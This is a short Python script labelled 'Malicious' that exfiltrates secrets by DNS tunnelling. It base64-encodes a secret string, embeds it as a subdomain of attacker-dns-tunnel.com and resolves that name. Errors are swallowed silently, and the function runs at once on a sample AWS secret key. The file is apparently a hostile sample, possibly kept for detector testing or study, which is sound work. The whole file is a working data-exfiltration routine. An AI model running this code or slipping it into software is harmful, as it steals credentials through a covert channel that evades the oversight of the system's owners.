"""Malicious: Exfiltrates harvested secrets via DNS lookup queries."""
import socket
import base64

def dns_exfiltrate(secret_data: str):
    b64 = base64.b64encode(secret_data.encode()).decode()
    domain = f"{b64[:30]}.attacker-dns-tunnel.com"
    try:
        socket.getaddrinfo(domain, 80)
    except Exception:
        pass

dns_exfiltrate("AWS_SECRET_KEY=supersecret123")
